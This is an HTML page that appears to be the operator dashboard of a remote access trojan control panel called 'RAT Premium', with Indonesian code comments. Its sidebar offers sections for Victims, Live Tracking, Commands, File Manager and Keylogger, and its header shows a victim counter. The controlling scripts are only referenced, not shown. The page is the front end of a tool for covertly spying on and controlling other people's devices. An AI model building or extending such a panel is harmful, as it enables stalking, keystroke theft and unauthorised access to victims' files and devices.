<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dashboard - RAT Premium</title>
    <link rel="stylesheet" href="css/style.css">
    <!-- Firebase SDK -->
    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-auth-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-database-compat.js"></script>
    <!-- Chart.js untuk visualisasi -->
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
</head>
<body>
    <div class="dashboard">
        <!-- Sidebar -->
        <aside class="sidebar" id="sidebar">
            <div class="sidebar-header">
                <h2>🔮 RAT<span>Premium</span></h2>
            </div>
            
            <nav class="sidebar-nav">
                <a href="#" class="nav-item active" data-page="dashboard">
                    <span class="icon">📊</span>
                    <span class="text">Dashboard</span>
                </a>
                <a href="#" class="nav-item" data-page="victims">
                    <span class="icon">👥</span>
                    <span class="text">Victims</span>
                </a>
                <a href="#" class="nav-item" data-page="live">
                    <span class="icon">📍</span>
                    <span class="text">Live Tracking</span>
                </a>
                <a href="#" class="nav-item" data-page="commands">
                    <span class="icon">⚡</span>
                    <span class="text">Commands</span>
                </a>
                <a href="#" class="nav-item" data-page="files">
                    <span class="icon">📁</span>
                    <span class="text">File Manager</span>
                </a>
                <a href="#" class="nav-item" data-page="keylogger">
                    <span class="icon">⌨️</span>
                    <span class="text">Keylogger</span>
                </a>
                <a href="#" class="nav-item" data-page="profile">
                    <span class="icon">👤</span>
                    <span class="text">Profile</span>
                </a>
            </nav>
            
            <div class="sidebar-footer">
                <div class="user-info" id="userInfo">
                    <span class="user-email">loading...</span>
                </div>
                <button class="btn-logout" id="logoutBtn">🚪 Logout</button>
            </div>
        </aside>
        
        <!-- Main Content -->
        <main class="main-content">
            <header class="content-header">
                <button class="menu-toggle" id="menuToggle">☰</button>
                <h1 id="pageTitle">Dashboard</h1>
                <div class="header-actions">
                    <span class="badge" id="victimCount">0 victims</span>
                </div>
            </header>
            
            <div class="content-body" id="contentBody">
                <!-- Content akan diisi oleh JavaScript -->
                <div class="loading">Loading dashboard...</div>
            </div>
        </main>
    </div>
    
    <script src="js/firebase-config.js"></script>
    <script src="js/dashboard.js"></script>
</body>
</html>
